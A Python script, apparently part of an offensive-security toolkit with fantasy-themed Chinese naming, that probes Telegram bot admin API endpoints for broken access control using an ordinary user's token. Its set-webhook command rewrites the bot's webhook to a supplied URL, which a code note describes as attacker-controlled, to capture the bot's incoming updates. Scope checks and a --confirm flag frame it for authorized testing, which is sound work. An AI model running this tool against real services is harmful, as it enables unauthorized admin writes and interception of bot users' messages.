#!/usr/bin/env python3
"""TG Bot 管理面越权写 / webhook 劫持探针。

对齐：传承/飞鸽傀·钩.md
默认 probe 不改 webhook；set-webhook 需 --confirm。

示例:
  python3 炼蛊房/tg_bot_admin_bac.py probe \\
    --base https://授权API --case <案卷> --token \"$USER_JWT\"
"""
from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-tg_bot_admin_bac"

DEFAULT_PATHS = (
    "/api/v1/admin/telegram/bot",
    "/api/admin/telegram/bot",
    "/api/v1/telegram/bot",
    "/admin/telegram/bot",
)



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "tg_bot_bac"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] refuse out-of-scope host: {h}")


def http_json(
    url: str,
    *,
    method: str = "POST",
    body: dict[str, Any] | None = None,
    token: str | None = None,
    insecure: bool = False,
    timeout: float = 25.0,
) -> dict[str, Any]:
    data = None if body is None else json.dumps(body, ensure_ascii=False).encode("utf-8")
    headers = {
        "User-Agent": UA,
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
        headers["token"] = token
        headers["x-token"] = token
    req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
    ctx = ssl._create_unverified_context() if insecure else ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            code = resp.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        code = e.code
    try:
        parsed = json.loads(raw) if raw else {}
    except json.JSONDecodeError:
        parsed = {"_raw": raw[:2000]}
    return {"status": code, "json": parsed, "raw": raw}


def _success_hint(raw: str, j: Any) -> bool:
    text = raw + json.dumps(j, ensure_ascii=False)
    keys = ("设置成功", "success", "ok", "保存成功", "updated", "created")
    if any(k.lower() in text.lower() if k.isascii() else k in text for k in keys):
        return True
    if isinstance(j, dict) and j.get("code") in (0, 200, "0", "200"):
        return True
    return False


def cmd_probe(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    paths = [args.path] if args.path else list(DEFAULT_PATHS)
    body: dict[str, Any] = {}
    if args.body_json:
        body = json.loads(args.body_json)
    # minimal benign probe — no webhook hijack
    if not body:
        body = {"enabled": True, "probe": True}

    rows = []
    for path in paths:
        url = args.base.rstrip("/") + (path if path.startswith("/") else f"/{path}")
        r = http_json(url, method="POST", body=body, token=args.token, insecure=args.insecure)
        ok = r["status"] < 400 and _success_hint(r["raw"], r["json"])
        # 403/401 = not BAC
        denied = r["status"] in (401, 403) or any(
            x in r["raw"] for x in ("无权限", "权限不足", "Forbidden", "Unauthorized", "not admin")
        )
        rows.append(
            {
                "path": path,
                "status": r["status"],
                "success_hint": ok,
                "denied_hint": denied,
                "body_preview": r["raw"][:500],
                "json": r["json"],
            }
        )
        flag = "L1_OK" if ok and not denied else ("DENIED" if denied else f"HTTP{r['status']}")
        print(f"[{flag}] {path} → {r['status']} {r['raw'][:120].replace(chr(10), ' ')}")

    report = {
        "checked_at": _now(),
        "base": args.base,
        "l1_unauthorized_write": any(x["success_hint"] and not x["denied_hint"] for x in rows),
        "note": "L2 needs set-webhook --confirm to attacker-controlled URL + receive Update.",
        "webhook_modified": False,
        "rows": rows,
    }
    p = case_dir(args.case) / "probe.json"
    p.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[write] {p}")
    print(f"[verdict] l1_unauthorized_write={report['l1_unauthorized_write']}")
    return 0 if report["l1_unauthorized_write"] else 1


def cmd_set_webhook(args: argparse.Namespace) -> int:
    if not args.confirm:
        raise SystemExit("refusing: set-webhook requires --confirm (may break production bot)")
    ensure_scope(args.base)
    ensure_scope(args.webhook)
    path = args.path or "/api/v1/admin/telegram/bot"
    body: dict[str, Any] = {
        "webhook": args.webhook,
        "webhookUrl": args.webhook,
        "url": args.webhook,
    }
    if args.body_json:
        body.update(json.loads(args.body_json))
    url = args.base.rstrip("/") + path
    r = http_json(url, method="POST", body=body, token=args.token, insecure=args.insecure)
    ok = r["status"] < 400 and _success_hint(r["raw"], r["json"])
    report = {
        "checked_at": _now(),
        "path": path,
        "webhook": args.webhook,
        "status": r["status"],
        "success_hint": ok,
        "response": r["json"],
        "note": "Restore original webhook after authorized test.",
    }
    p = case_dir(args.case) / "set_webhook.json"
    p.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    try:
        p.chmod(0o600)
    except OSError:
        pass
    print(json.dumps(report, ensure_ascii=False, indent=2))
    return 0 if ok else 1


def main() -> int:
    p = argparse.ArgumentParser(description="TG bot admin BAC / webhook hijack probes")
    sub = p.add_subparsers(dest="cmd", required=True)

    pr = sub.add_parser("probe", help="USER token against admin telegram bot paths (no webhook change)")
    pr.add_argument("--base", required=True)
    pr.add_argument("--case", required=True)
    pr.add_argument("--token", required=True, help="ordinary USER JWT/session")
    pr.add_argument("--path", default="", help="single path; default try common list")
    pr.add_argument("--body-json", default="")
    pr.add_argument("--insecure", action="store_true")
    pr.set_defaults(func=cmd_probe)

    sw = sub.add_parser("set-webhook", help="Write webhook URL (destructive; needs --confirm)")
    sw.add_argument("--base", required=True)
    sw.add_argument("--case", required=True)
    sw.add_argument("--token", required=True)
    sw.add_argument("--webhook", required=True)
    sw.add_argument("--path", default="/api/v1/admin/telegram/bot")
    sw.add_argument("--body-json", default="")
    sw.add_argument("--confirm", action="store_true")
    sw.add_argument("--insecure", action="store_true")
    sw.set_defaults(func=cmd_set_webhook)

    args = p.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
